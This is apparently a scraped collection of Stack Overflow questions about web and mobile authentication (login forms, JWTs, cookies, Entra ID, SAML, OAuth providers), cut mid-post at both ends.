    }
  };

  return (
    &lt;div className={""login_container""}&gt;
      &lt;div className={""login_form_container""}&gt;
        &lt;div className={""left""}&gt;
          &lt;form className={""form_container""} onSubmit={handleSubmit}&gt;
            &lt;h1&gt;Login to Your Account&lt;/h1&gt;
            &lt;input
              type=""text""
              placeholder=""Enrollment No""
              name=""enrollment_no""
              onChange={handleChange}
              value={data.enrollment_no}
              required
              className={""input""}
            /&gt;
            &lt;input
              type=""password""
              placeholder=""Password""
              name=""password""
              onChange={handleChange}
              value={data.password}
              required
              className={""input""}
            /&gt;
            {error &amp;&amp; &lt;div className={""error_msg""}&gt;{error}&lt;/div&gt;}
            &lt;button type=""submit"" className={""green_btn""}&gt;
              Sign In
            &lt;/button&gt;
          &lt;/form&gt;
        &lt;/div&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  );
};

export default Login;</code></pre>
</div>
</div>
</p>
<p>auth.js</p>
<p><div class=""snippet"" data-lang=""js"" data-hide=""false"" data-console=""true"" data-babel=""false"">
<div class=""snippet-code"">
<pre class=""snippet-code-js lang-js prettyprint-override""><code>exports.signin = (req, res) =&gt; {
    const { enrollment_no, password } = req.body; // Changed Student_id to enrollment_no
    const errors = [];

    if (!enrollment_no || !password) {
        errors.push({ message: ""Enrollment No and password are required"" }); // Changed Student ID to Enrollment No
    }

    if (errors.length &gt; 0) {
        return res.status(422).json({ errors: errors });
    }

    User.findOne({ enrollment_no: enrollment_no }) // Changed Student_id to enrollment_no
        .then(user =&gt; {
            if (!user) {
                return res.status(404).json({ errors: [{ message: ""User not found"" }] });
            }

            bcrypt.compare(password, user.password)
                .then(isMatch =&gt; {
                    if (!isMatch) {
                        return res.status(400).json({ errors: [{ message: ""Incorrect password"" }] });
                    }

                    const access_token = createJWT(user.enrollment_no, user._id, 3600); // Changed Student_id to enrollment_no

                    jwt.verify(access_token, process.env.TOKEN_SECRET, (err, decoded) =&gt; {
                        if (err) {
                            return res.status(500).json({ errors: [{ message: ""Failed to verify token"" }] });
                        }

                        if (decoded) {
                            return res.status(200).json({
                                success: true,
                                token: access_token,
                                user: user
                            });
                        }
                    });
                })
                .catch(err =&gt; {
                    res.status(500).json({ errors: [{ message: err.message }] });
                });
        })
        .catch(err =&gt; {
            res.status(500).json({ errors: [{ message: err.message }] });
        });
}</code></pre>
</div>
</div>
</p>
<p>i tried to change index file because when i send sigin req i directly redirect without validate and get index.js:7  No routes matched location &quot;/&quot; warning</p>
<p>in case when i enter any credential i get login without authentication</p>
"
"<p>I'm currently developing a mobile app using Flutter for iOS and Android for a customer whose application already exists for the web + has been setup in the form of a REST API already. The idea is to use the same backend for both the backend of the website + the backend of the mobile app; including authentication.
The authentication currently works for the web application using multiple http-only cookies. So I initially though that I would need to ask the customer to include the cookie values within the response payload for requests incoming from the mobile app, as I did not expect httponly cookies to be available to Flutter code.</p>
<p>I now however noticed that, when using <a href=""https://pub.dev/packages/http"" rel=""nofollow noreferrer"">Dart's http package</a>, I'm actually able to extract the value of all cookies, including the http-only cookies, via the <code>response.headers</code> property (<code>set-cookie</code> headers). That at least for now in development mode, when testing the app using <code>flutter run</code>, but with the real production REST API.</p>
<p>Is this normal and available by default for all clients / devices? So won't we have to code a workaround to be able to extract the http-only cookies values within Flutter?</p>
"
"<p>I'm using Authentik and have it working with services/providers.</p>
<p>I have a few different clients and would like to use the tenancy option.
My questions are</p>
<ol>
<li>Does each tenant have to be a different outpost (and thus running container)</li>
<li>Can't I just create multiple tenants in my default installation?</li>
<li>Can I add users/groups specific to a tenant?</li>
</ol>
<p>Thanks</p>
"
"<p>I have a web app service for which I am trying to configure Azure Entra ID authentication. The issue I'm having is I am able to log in, but other users are not. They continually receive &quot;Admin consent is required for the permissions requested by this application. An admin consent request may be sent to the admin.&quot; However, none of the permissions set require admin consent.</p>
<p>I have the ability to create application registrations in Entra ID, and I've recreated the app registration several times. However, I do not have specific permissions to change the enterprise app settings.</p>
<p>These first screenshots are of the app registration authentication settings.</p>
<p><a href=""https://i.stack.imgur.com/3Ar6Q.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/3Ar6Q.png"" alt=""App Registration Authentication"" /></a>
<a href=""https://i.stack.imgur.com/UN9RP.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/UN9RP.png"" alt=""App Registration Authentication"" /></a></p>
<p>Next are the assigned API permissions
<a href=""https://i.stack.imgur.com/Bn7Hh.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/Bn7Hh.png"" alt=""enter image description here"" /></a></p>
<p>That is it as far as the app registration is concerned.</p>
<p>As for the authentication settings for the app service, they are shown here
<a href=""https://i.stack.imgur.com/VZHwZ.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/VZHwZ.png"" alt=""enter image description here"" /></a></p>
<p>I've searched and read through a number of similar questions here on SO, such as <a href=""https://stackoverflow.com/questions/44081476/azure-ad-admin-consent-required-when-it-shouldnt"">Azure AD admin consent required when it shouldn't</a> and <a href=""https://stackoverflow.com/questions/74791974/azure-ad-authentication-access-without-admin-consent-to-application"">Azure AD authentication access without admin consent to application</a>. The answers to these questions do not help. As you can see, I don't have permission/authorization to provide admin consent for the organization.
<a href=""https://i.stack.imgur.com/aGPzj.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/aGPzj.png"" alt=""enter image description here"" /></a></p>
<p>The same is true for the enterprise application. All settings are disabled for the application in the Self-Service blade.</p>
<p><a href=""https://i.stack.imgur.com/Jln4d.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/Jln4d.png"" alt=""enter image description here"" /></a></p>
<p>And I do not have any permissions that require admin consent.</p>
<p><a href=""https://i.stack.imgur.com/lSt5p.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/lSt5p.png"" alt=""enter image description here"" /></a>
<a href=""https://i.stack.imgur.com/pJ8z2.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/pJ8z2.png"" alt=""enter image description here"" /></a></p>
<p>In adding the app registration, I've followed <a href=""https://learn.microsoft.com/en-us/azure/app-service/configure-authentication-provider-aad?tabs=workforce-tenant#advanced"" rel=""nofollow noreferrer"">Configure your App Service or Azure Functions app to use Microsoft Entra sign-in</a> as well as <a href=""https://learn.microsoft.com/en-us/entra/identity-platform/quickstart-register-app"" rel=""nofollow noreferrer"">Quickstart: Register an application with the Microsoft identity platform</a>.</p>
<p>Is there a way to solve this, or do I have to go back to my Entra admins and ask them to change something?</p>
"
"<p>Trying to login to my website. when I enter false info it recgognizes bad login, when I enter correct credentials, It states login good then just refreshes login page.</p>
<p>snippet from index.php:</p>
<pre><code>&lt;script&gt;
function logIn() {
var username = $(&quot;#username&quot;).val();
var adpass = $(&quot;#adpass&quot;).val();

$.ajax({
    url: 'inc/core_user_functions.php',
    method: 'POST', // Use POST method
    data: {
        action: 'login',
        username: username,
        adpass: adpass
    },
    success: function (data) {
        if (data === 'bad') {
            displayMessage(&quot;#bad&quot;);
        } else {
            displayMessage(&quot;#good&quot;);
            setTimeout(update, 1000);
        }
    }
 });
}

function displayMessage(selector) {
    $(&quot;#good, #bad&quot;).hide();
    $(selector).fadeIn('slow');
}

function update() {
window.location = 'dashboard.php';
}

$(function () {
    $(&quot;#username&quot;).focus();

    $('#adpass').on('keydown', function (e) {
        if (e.which === 13) {
            e.preventDefault(); // Prevent the default action (form submission)
            logIn();
        }
    });
});
&lt;/script&gt;
</code></pre>
<p>Authenticater file:</p>
<pre><code>$act = $_REQUEST['action'];

// -------------------LOGIN------------------------

if ($act == 'login') {
   $username = $_REQUEST['username'];
   $adpass = $_REQUEST['adpass'];

   try {
       $conn = new mysqli($server, $user, $pass, $db);

       if ($conn-&gt;connect_error) {
           die(&quot;Connection failed: &quot; . $conn-&gt;connect_error);
       }

       $stmt = $conn-&gt;prepare(&quot;SELECT * FROM core_users WHERE usrname = ? AND usrpass = ?&quot;);
       $stmt-&gt;bind_param(&quot;ss&quot;, $username, $adpass);
       $stmt-&gt;execute();

       $result = $stmt-&gt;get_result();

       if ($result-&gt;num_rows == 1) {
           $row = $result-&gt;fetch_assoc();
           $session_id = session_id();

           // Use prepared statement for the INSERT query as well
           $stmt = $conn-&gt;prepare(&quot;INSERT INTO access_monitor (usrid, accessstart, page_view,     saasid) VALUES (?, ?, 'Logged In', ?)&quot;);
           $stmt-&gt;bind_param(&quot;iss&quot;, $row['usr_id'], date('Y-m-d H:i:s'), $row['saasid']);
           $stmt-&gt;execute();

           $_SESSION['access'] = $session_id;
           $_SESSION['usrid'] = $row['usr_id'];
           $_SESSION['saasid'] = $row['saasid'];

           // Regenerate session ID for security
           session_regenerate_id();

           echo 'good';
       } else {
           echo 'bad';
       }

       $stmt-&gt;close();
   } catch (Exception $e) {
       // Handle exceptions here
       echo 'error';
   } finally {
       // Close the database connection
       $conn-&gt;close();
  }
}

// -------------------LOGOUT------------------------

if ($act == 'logout') {
    session_unset();
    session_destroy();
}
?&gt;
</code></pre>
<p>I believe my problem may be in these 2 sections, Any help or advice would be greatly appreciated</p>
<p>adding dashboard.php</p>
<pre><code>&lt;?php include('inc/header.php'); ?&gt;

&lt;script&gt;

$(function (){
getRevs();
getWrkd();
getInvc();
getAr();
getPo();
getEst();
getAmon();
 getInvot();
});

function getRevs(){
    $.ajax({
url: 'inc/revenue_widget.php?action=getcur',
success: function(data) {
$(&quot;#rev_hold&quot;).html(data);
}
});
}

function getWrkd(){
    $.ajax({
url: 'inc/workorder_widget.php?action=get',
success: function(data) {
$(&quot;#workorder_hold&quot;).html(data);
}
</code></pre>
<p>});
}</p>
<pre><code>function getInvc(){
    $.ajax({
url: 'inc/invoice_widget.php?action=pullinvoicetrack',
success: function(data) {
$(&quot;#invoice_hold&quot;).html(data);
}
});
}


function getAr(){
    $.ajax({
url: 'inc/ap_widget.php?action=getsap',
success: function(data) {
$(&quot;#acct_hold&quot;).html(data);
}
});
}

//getpos
function getPo(){
    $.ajax({
url: 'inc/po_widget.php?action=getpos',
success: function(data) {
$(&quot;#purchase_hold&quot;).html(data);

 }
});
}

//getest
function getEst(){
    $.ajax({
url: 'inc/estimate_widget.php?action=getest',
success: function(data) {
$(&quot;#estimates_hold&quot;).html(data);

}
});
}
    
    //getaccess
    function getAmon(){
    $.ajax({
url: 'inc/audit_widget.php?action=gettree',
success: function(data) {
$(&quot;#audit_hold, #date_hold&quot;).html(data);

}
});
}

function getInvot(){
    $.ajax({
url: 'inc/inventory_widget.php?action=getivoss',
success: function(data) {
$(&quot;#lowinv_hold&quot;).html(data);

}
});
}


&lt;/script&gt;

&lt;!--widget holder--&gt;
&lt;div id=&quot;widg_hold&quot;&gt;

    &lt;!--revenue widget--&gt;
    &lt;div id=&quot;rev_box&quot;&gt;
    &lt;div style=&quot;text-indent:5px; padding-bottom:5px;&quot;&gt;Revenue 
Comparison&lt;/div&gt;
    &lt;div id=&quot;rev_hold&quot;&gt;&lt;/div&gt;
    &lt;/div&gt;
    &lt;!--end revenue--&gt;
    
        &lt;!--revenue widget--&gt;
    &lt;div id=&quot;workorder_box&quot;&gt;
    &lt;div style=&quot;text-indent:5px; padding-bottom:5px;&quot;&gt;Work Order 
 Summary&lt;/div&gt;
    &lt;div id=&quot;workorder_hold&quot;&gt;&lt;/div&gt;
    &lt;/div&gt;
    &lt;!--end revenue--&gt;

&lt;!--revenue widget--&gt;
  &lt;div id=&quot;invoice_box&quot;&gt;
    &lt;div style=&quot;text-indent:5px; padding-bottom:5px; 
position:relative&quot;&gt;Invoice &lt;img style=&quot;position:absolute; top: 
4px; left: 66px;&quot; src=&quot;images/ar_rit.gif&quot; width=&quot;16&quot; 
height=&quot;15&quot;&gt;&lt;/div&gt;
    &lt;div id=&quot;invoice_hold&quot;&gt;
    
    &lt;/div&gt;
    &lt;/div&gt;
    &lt;!--end revenue--&gt;
    
    &lt;div style=&quot;clear:both; height:30px&quot;&gt;&lt;/div&gt;        
    
    
    &lt;!--accounts widget--&gt;
    &lt;div id=&quot;acct_box&quot;&gt;
    &lt;div style=&quot;text-indent:5px; padding-bottom:5px;&quot;&gt;Accounts 
Payable&lt;/div&gt;
    &lt;div id=&quot;acct_hold&quot;&gt;
    
    
    &lt;/div&gt;&lt;/div&gt;
    &lt;!--end revenue--&gt;
    
        &lt;!--purchase widget--&gt;
    &lt;div id=&quot;purchase_box&quot;&gt;
    &lt;div style=&quot;text-indent:5px; padding-bottom:5px;&quot;&gt;Purchase 
Orders&lt;/div&gt;
    &lt;div id=&quot;purchase_hold&quot;&gt;
    
    
    
    
    
    &lt;/div&gt;
    &lt;/div&gt;
    &lt;!--end revenue--&gt;

&lt;!--estimate widget--&gt;
  &lt;div id=&quot;estimates_box&quot;&gt;
    &lt;div style=&quot;text-indent:5px; padding-bottom:5px; 
position:relative&quot;&gt;Estimates&lt;/div&gt;
    &lt;div id=&quot;estimates_hold&quot;&gt;&lt;/div&gt;
    &lt;/div&gt;
    &lt;!--end revenue--&gt;
    
    &lt;div style=&quot;clear:both; height:30px&quot;&gt;&lt;/div&gt;        
    
    
    &lt;!--accounts widget--&gt;
    &lt;div id=&quot;audit_box&quot;&gt;
    &lt;div style=&quot;text-indent:5px; padding-bottom:5px;&quot;&gt;Audit 
Log&lt;/div&gt;
    &lt;div id=&quot;audit_hold&quot;&gt;&lt;/div&gt;
    &lt;/div&gt;
    &lt;!--end revenue--&gt;
    
        &lt;!--purchase widget--&gt;
    &lt;div id=&quot;lowinv_box&quot;&gt;
    &lt;div style=&quot;text-indent:5px; padding-bottom:5px;&quot;&gt;Low 
Inventory&lt;/div&gt;
    &lt;div id=&quot;lowinv_hold&quot;&gt;&lt;/div&gt;
    &lt;/div&gt;
    &lt;!--end revenue--&gt;

&lt;!--estimate widget--&gt;
  &lt;div id=&quot;date_box&quot;&gt;
    &lt;div style=&quot;text-indent:5px; padding-bottom:5px; 
  position:relative&quot;&gt;Date / Time User Module&lt;/div&gt;
    &lt;div id=&quot;date_hold&quot;&gt;&lt;/div&gt;
    &lt;/div&gt;
    &lt;!--end revenue--&gt;










&lt;/div&gt;
&lt;!--widget end--&gt;

&lt;div id=&quot;footer&quot;&gt;&lt;/div&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>header.php:</p>
<pre><code>&lt;?php
date_default_timezone_set('America/Chicago');
session_start();
error_reporting(E_ALL);
ini_set('display_errors', 1);
include('config.php');

if (isset($_SESSION['access'])) {
$stmt = mysqli_prepare($conn, &quot;SELECT * FROM core_users WHERE 
sessid = ?&quot;);

if ($stmt === false) {
    die('Error preparing query: ' . mysqli_error($conn));
}

mysqli_stmt_bind_param($stmt, &quot;s&quot;, $_SESSION['access']);
mysqli_stmt_execute($stmt);

$result = mysqli_stmt_get_result($stmt);

if ($result === false) {
    die('Error executing query: ' . mysqli_error($conn));
}

$userRow = mysqli_fetch_array($result);
$numRows = mysqli_num_rows($result);

if ($numRows == 1) {
    $sysName = $userRow[&quot;fname&quot;] . ' ' . $userRow[&quot;lname&quot;];
} else {
    header('Location: index.php');
    exit();
}
} else {
header('Location: index.php');
exit();
</code></pre>
<p>}</p>
<pre><code>// Close the database connection when done
mysqli_close($conn);
?&gt;


&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;BCiFsm&lt;/title&gt;
&lt;!-- Include jQuery and other scripts --&gt;
&lt;!-- Ensure these scripts are available or replace them with the correct paths --&gt;
&lt;script src=&quot;js/jquery-1.12.4.min.js&quot; type=&quot;text/javascript&quot;&gt; 
 &lt;/script&gt;
&lt;script src=&quot;js/jquery-ui-1.13.2.custom.min.js&quot; 
 type=&quot;text/javascript&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;js/jquery.uniform.min.js&quot; type=&quot;text/javascript&quot;&gt; 
 &lt;/script&gt;
&lt;script src=&quot;js/jquery.tipTip.js&quot; type=&quot;text/javascript&quot;&gt; 
</code></pre>
   
<pre><code>&lt;!-- Include CSS files --&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;css/custom-theme/jquery-ui- 
</code></pre>
<p>1.11.3.custom.css&quot; type=&quot;text/css&quot; media=&quot;all&quot; /&gt;





</p>


Action performed successfully!

Read Access Denied for: '.$_REQUEST['pageset'].'! Please contact your admin.';
}
?>

<pre><code>&lt;div id=&quot;head_contain&quot;&gt;
    &lt;div id=&quot;logo_holder&quot;&gt;&lt;a href=&quot;dashboard.php&quot;&gt;&lt;img src=&quot;images/csl_logo_white.png&quot; width=&quot;161&quot; height=&quot;64&quot; border=&quot;0&quot;&gt;&lt;/a&gt;&lt;/div&gt;
        &lt;div id=&quot;acc_text&quot;&gt;Welcome, &lt;?php echo $sysName; ?&gt; | &lt;a href=&quot;javascript:logOut()&quot;&gt;Logout&lt;/a&gt;
            &lt;br&gt;
                &lt;br&gt;
                
                &lt;/div&gt;
                    &lt;/div&gt;
    &lt;!--nav--&gt;
    
                    &lt;?php include('link_handler.php'); ?&gt;
                    &lt;div id=&quot;nav&quot;&gt;
                        &lt;ul&gt;
                        &lt;a href=&quot;customers.php&quot;&gt;&lt;li class=&quot;&lt;?php echo $customer_nav; ?&gt;&quot;&gt;CUSTOMERS&lt;/li&gt;&lt;/a&gt;
                            &lt;a href=&quot;estimates.php&quot;&gt;&lt;li class=&quot;&lt;?php echo $estimates_nav; ?&gt;&quot;&gt;ESTIMATES&lt;/li&gt;&lt;/a&gt;
                                 &lt;a href=&quot;work_orders.php&quot;&gt;&lt;li class=&quot;&lt;?php echo $workorders_nav; ?&gt;&quot;&gt;WORK ORDERS&lt;/li&gt;&lt;/a&gt;
                                    &lt;a href=&quot;scheduler.php&quot;&gt; &lt;li class=&quot;&lt;?php echo $scheduler_nav; ?&gt;&quot;&gt;SCHEDULing&lt;/li&gt;&lt;/a&gt;
                                 &lt;a href=&quot;invoice.php&quot;&gt;&lt;li class=&quot;&lt;?php echo $invoice_nav; ?&gt;&quot;&gt;INVOICES&lt;/li&gt;&lt;/a&gt;
                            &lt;a href=&quot;purchase_orders.php&quot;&gt; &lt;li class=&quot;&lt;?php echo $purchase_nav; ?&gt;&quot;&gt;PURCHASE ORDERS&lt;/li&gt;&lt;/a&gt;
                       &lt;a href=&quot;accounting.php&quot;&gt;  &lt;li class=&quot;&lt;?php echo $accounting_nav; ?&gt;&quot;&gt;ACCOUNTING&lt;/li&gt;&lt;/a&gt;
                        &lt;a href=&quot;admin.php&quot;&gt; &lt;li class=&quot;&lt;?php echo $admin_nav; ?&gt;&quot;&gt;ADMIN&lt;/li&gt;&lt;/a&gt;
                            &lt;/ul&gt;
                    
                        &lt;/div&gt;
                    &lt;!--end nav--&gt;
        &lt;div id=&quot;pag_box&quot;&gt;
        &lt;div id=&quot;loader&quot; style=&quot;width:24px; height:24px; float:left; display:none; padding:15px&quot;&gt;&lt;img style=&quot;padding-top:9px&quot; src=&quot;images/loader.gif&quot; width=&quot;24&quot; height=&quot;24&quot;&gt;&lt;/div&gt;
        &lt;div style=&quot;clear:both&quot;&gt;&lt;/div&gt;
            &lt;div id=&quot;pag_text&quot;&gt;&lt;div style=&quot;float:left; padding-top:3px&quot;&gt;&lt;?php echo $page_name; ?&gt;&lt;/div&gt;    
            &lt;?php echo $addButton; ?&gt;
          &lt;/div&gt;
            
                &lt;div id=&quot;pag_extras&quot; style=&quot;position:relative&quot;&gt;
                
                    
                  
                &lt;?php include('search_inputs.php'); ?&gt;
                            
          &lt;/div&gt;
            
                &lt;/div&gt;
        &lt;!--end header--&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre>
"
"<p>I am working on implementing authentication and authorization in my ASP.NET Core application, but I'm encountering an error that I'm unable to resolve. I have a class <code>AppDbContext</code> that inherits from <code>IdentityDbContext&lt;ApplicationUser&gt;</code> to handle user-related data. Here is the code:
I have CS0311 Error on AppDbContext</p>
<pre class=""lang-cs prettyprint-override""><code>using AuthenNAuthorizationRoles.Models;
using Microsoft.AspNetCore.Identity.EntityFrameworkCore;
using Microsoft.EntityFrameworkCore;

namespace AuthenNAuthorizationRoles.Services
{
    public class **AppDbContext **: IdentityDbContext&lt;ApplicationUser&gt;
    {
        public AppDbContext(DbContextOptions&lt;AppDbContext&gt; options) : base(options)
        {
            
        }
    }
}


I have ensured that all necessary packages are installed and that my Program.cs file is correctly configured for authentication and authorization.

Error : https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-messages/cs0311?f1url=%3FappId%3Droslyn%26k%3Dk(CS0311)

Can anyone help me understand what might be causing this error and how to resolve it? Any insights or suggestions would be greatly appreciated. Thank you!
</code></pre>
"
"<p>I'm a django newby and I'm looking to expose basic services like: forgotten password, password change.</p>
<p>I would expect to have those services for free but looking here and there it looks like we have to do them by hand, is that correct?</p>
<p>Is there any explanation for that?</p>
"
"<p>Good day, I ran into this problem: when the user has an active session, nothing happens when the <code>VKID.authenticate()</code> method is launched, and a message arrives in <code>VKIDAuthFail.description</code> stating that the user has returned to activity without authorization. If user does not have an active session, authorization is normal.</p>
<p>Below is my code, maybe it will help you</p>
<pre><code>private fun onAuthorize() {
    viewModelScope.launch {
        vkId.authorize(authCallback)
    }
}
</code></pre>
<p><code>authCallback</code>:</p>
<pre><code>private val authCallback = object : VKID.AuthCallback {
    override fun onFail(fail: VKIDAuthFail) {
        Log.d(&quot;msg&quot;, fail.description)
    }
    
    override fun onSuccess(accessToken: AccessToken) {
        shPrefs.edit()
            .putString(ACCESS_TOKEN_KEY, accessToken.token)
            .apply()
        
        _authorizationScreenState.value = AuthorizationScreenState.Authorized
    }
}
</code></pre>
<p>and manifest placeholders:
<a href=""https://i.stack.imgur.com/fO9Sc.png"" rel=""nofollow noreferrer"">https://i.stack.imgur.com/fO9Sc.png</a></p>
"
"<p>We are using multiple auth providers:</p>
<pre><code>ApiKeyAuthProvider
CustomJwt
CustomOAuth2Provider
</code></pre>
<p>AuthFeature Options:</p>
<pre><code>IncludeDefaultLogin = false
IncludeAssignRoleServices = false
IncludeRegistrationService = false
</code></pre>
<p>These are set as the auth on different endpoints. We are calling an endpoint with ApiKey auth which works perfectly if the API key is correct and valid. If we add an invalid key, after recieving the 401 we end up with a basic auth pop up.</p>
<p>Is there anyway to disable this behaviour as we only wish to use the API auth on that endpoint?</p>
"
"<pre><code> private string GenerateJSONWebToken(pswd user)
 {
     var securityKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_config[&quot;Jwt:Key&quot;]));
     var credentials = new SigningCredentials(securityKey, SecurityAlgorithms.HmacSha256);
     var token = new JwtSecurityToken(_config[&quot;Jwt:Issuer&quot;],
         _config[&quot;Jwt:Issuer&quot;],
         null,
         expires: DateTime.Now.AddYears(100),
         signingCredentials: credentials);
            
     return new JwtSecurityTokenHandler().WriteToken(token);
  }

</code></pre>
<p>Here I am adding expiry of token to be after 100 years.
I get this error
<a href=""https://i.stack.imgur.com/RGFOY.png"" rel=""nofollow noreferrer"">enter image description here</a></p>
<p>The generated token is correct , I debugged it and checked the expiry date which was after 100 years . But the token which is generated is not working and not able to access the data from the web api which it is intended for.
The maximum value I can add to expiry is up to 10 years , till that the generated token is working perfectly find . It is able to fetch data properly with 200 response code.</p>
<p>How can I can set lifetime validity to jwt token and why I am getting error as &quot;no expiry&quot; when even I set expiry to 100 years or more .</p>
"
"<p>I have a front and backend app, front is react and backend is python Django (DRF), so my problem is I store the <code>refresh token</code> inside an <code>HttpOnly cookie</code> and send it in every request, but the DRF endpoint for refresh token (<code>rest_framework_simplejwt.views.TokenRefreshView</code>) will read the token itself from <code>request.data</code> which is the body of the <code>Http</code> request, is there a better way to handle this view other than rewriting a custom view?</p>
"
"<p>i have a web-app with installed SimplesamlPhp. I have multiple different cusomters on this SP all independent of each other. Now i wan't to give every customer the opportunity to add his own IDP without me editing the necessary files everytime.</p>
<p>so i'd like to use the SimplesamlPhp code to convert the customers XML-File generate my own XML-File and add the IDP + authsource, has anyone any excperience with that? The documentation doesn't seem to help. If not possible has anyone another package to recommend?</p>
"
"<p>I have implemented Apple authentication on a mobile app and a web app. The first time a user authenticates, Apple sends back information including the email they used as part of the ID token. Subsequent authentications don't send the email address as part of the token.</p>
<p>It is possible for someone to either change the primary email address of their Apple ID, or to add/remove additional email addresses. The problem is that I can't find a way to detect this change - the apple server-to-server notifications don't notify us about these changes, and there doesn't seem to be a way we can obtain that information on iOS without asking the user to manually unlink the app from their Apple ID and then log back in.</p>
<p>Does anyone know of a way to detect these changes?</p>
"
"<p>Good morning</p>
<p>I have an ASP.net Core app, this app list all the users in the organization of the user who is login.</p>
<p>I made the login using the <strong>Authorization Code Flow</strong> and ask for delegated permissions to list users, see calendar, etc.</p>
<p>This is the code I used to authenticate the user</p>
<pre><code>var builder = WebApplication.CreateBuilder(args);

// Configure authentication
builder.Services

    // Use OpenId authentication
    .AddAuthentication(OpenIdConnectDefaults.AuthenticationScheme)

    // Specify this is a web app and needs auth code flow
    .AddMicrosoftIdentityWebApp(options =&gt;
    {
        builder.Configuration.Bind(&quot;AzureAd&quot;, options);

        // This causes the signin to prompt the user for which
        // account to use - useful when there are multiple accounts signed
        // into the browser
        options.Prompt = &quot;select_account&quot;;

        options.Events.OnTokenValidated = async context =&gt;
        {
            var tokenAcquisition = context.HttpContext.RequestServices
                .GetRequiredService&lt;ITokenAcquisition&gt;();


            var graphClient = new GraphServiceClient(
                new BaseBearerTokenAuthenticationProvider(
                    new TokenAcquisitionTokenProvider(
                        tokenAcquisition,
                        GraphConstants.Scopes,
                        context.Principal)));


            // Get user information from Graph
            var user = await graphClient.Me
                .GetAsync(config =&gt;
                {
                    config.QueryParameters.Select =
                        [&quot;displayName&quot;, &quot;mail&quot;, &quot;mailboxSettings&quot;, &quot;userPrincipalName&quot;];
                });

            context.Principal?.AddUserGraphInfo(user);

        };

        options.Events.OnAuthenticationFailed = context =&gt;
        {
            var error = WebUtility.UrlEncode(context.Exception.Message);
            context.Response
                .Redirect($&quot;/Home/ErrorWithMessage?message=Authentication+error&amp;debug={error}&quot;);
            context.HandleResponse();

            return Task.FromResult(0);
        };

        options.Events.OnRemoteFailure = context =&gt;
        {
            if (context.Failure is OpenIdConnectProtocolException)
            {
                var error = WebUtility.UrlEncode(context.Failure.Message);
                context.Response
                    .Redirect($&quot;/Home/ErrorWithMessage?message=Sign+in+error&amp;debug={error}&quot;);
                context.HandleResponse();
            }

            return Task.FromResult(0);
        };
    })

    // Add ability to call web API (Graph)
    // and get access tokens
    .EnableTokenAcquisitionToCallDownstreamApi(
        options =&gt;
        {
            builder.Configuration.Bind(&quot;AzureAd&quot;, options);
        },
        GraphConstants.Scopes)

    // Add a GraphServiceClient via dependency injection
    .AddMicrosoftGraph(options =&gt;
    {
        options.Scopes = GraphConstants.Scopes;
    })

    // Use in-memory token cache
    // See https://github.com/AzureAD/microsoft-identity-web/wiki/token-cache-serialization
    .AddInMemoryTokenCaches();


// Require authentication
builder.Services
    .AddControllersWithViews(options =&gt;
    {
        var policy = new AuthorizationPolicyBuilder()
            .RequireAuthenticatedUser()
            .Build();
        options.Filters.Add(new AuthorizeFilter(policy));
    })

    // Add the Microsoft Identity UI pages for sign in/out
    .AddMicrosoftIdentityUI();

var app = builder.Build();

// Configure the HTTP request pipeline.
if (!app.Environment.IsDevelopment())
{
    app.UseExceptionHandler(&quot;/Home/Error&quot;);
    app.UseHsts();
}

app.UseHttpsRedirection();
app.UseStaticFiles();

app.UseRouting();

app.UseAuthentication();
app.UseAuthorization();

app.MapControllerRoute(
    name: &quot;default&quot;,
    pattern: &quot;{controller=Home}/{action=Index}/{id?}&quot;);

app.Run();
</code></pre>
<p>Now I need to implement callings features, for this I need to get access to Applications Permissions which mean I have to create the <strong>Client Credentials Flow</strong></p>
<p>There is a way to keep both?</p>
<p>I tried to add this piece of code</p>
<pre><code>// Add the Microsoft Identity Web App services for Client Credentials Flow
builder.Services.AddMicrosoftIdentityWebAppAuthentication(builder.Configuration, &quot;Azure&quot;)
    .EnableTokenAcquisitionToCallDownstreamApi(
    options =&gt;
    {
       builder.Configuration.Bind(&quot;Azure&quot;, options);
    },
    GraphConstants.ScopesApp)
    .AddInMemoryTokenCaches();
</code></pre>
<p>but got this error
<a href=""https://i.stack.imgur.com/wKsbo.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/wKsbo.png"" alt=""enter image description here"" /></a></p>
<p>What I think mean I'm trying to authenticate 2 times in the same Schema.</p>
<p>Any Idea to keep both flows?</p>
"
"<p>I try to follow the documentation of next-auth.js. In the documentation I see the following Lazy initialization:</p>
<pre><code>import NextAuth from &quot;next-auth&quot;
import GitHub from &quot;@auth/core/providers/github&quot;

export const { handlers, auth } = NextAuth((req) =&gt; {
  console.log(req) // do something with the request
  return {
    providers: [GitHub],
  },
})
</code></pre>
<p>But while doing this I got a type error:</p>
<blockquote>
<p>Type error: Argument of type '(req: any) =&gt; { providers:
OAuthConfig[]; secret: string | undefined; }' is not
assignable to parameter of type 'AuthOptions'.</p>
</blockquote>
<p>How do I need to read and solve this? I already put an any type to the 'req' but it does not help.</p>
"
"<p>The MS documentation on certificate authentication is a bit bewildering to me as a relatively new Core developer, and the code that I've cobbled together doesn't seem actually doesn't seem to work correctly - I'm able to get it to prompt me for my cert, but it doesn't seem to want to want to authenticate it.  What I'm basically trying to do is to prompt the user for a certificate, and if they escape out of that prompt they go to the log in page, which does work, but if they choose their cert, it should check to see if their EDIPI from the cert is in the database, and if it isn't redirect them to the login page, and if it is, log them in.  Here is what I have for my AddAuthentication code (in program.cs as I don't use a startup.cs):</p>
<pre><code>builder.Services.AddAuthentication(CookieAuthenticationDefaults.AuthenticationScheme)
.AddCookie(options =&gt;
{
    // Your existing cookie configuration

    options.LoginPath = &quot;/Identity/Account/Login&quot;;
})
